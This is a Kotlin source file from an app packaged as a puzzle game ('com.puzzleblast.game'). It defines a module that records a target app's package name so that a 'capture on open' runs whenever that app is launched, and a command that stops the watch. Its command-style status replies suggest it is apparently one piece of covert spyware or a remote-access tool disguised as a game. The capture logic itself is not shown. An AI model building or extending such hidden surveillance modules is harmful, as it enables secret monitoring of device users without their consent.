package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Prefs

object AppOpenWatchModule {
    suspend fun watch(ctx: Context, pkg: String): String {
        Prefs.appOpenWatchPkg = pkg
        return "👁 watching $pkg — capture on open"
    }

    suspend fun stop(ctx: Context): String {
        Prefs.appOpenWatchPkg = ""
        return "👁 watch stopped"
    }
}
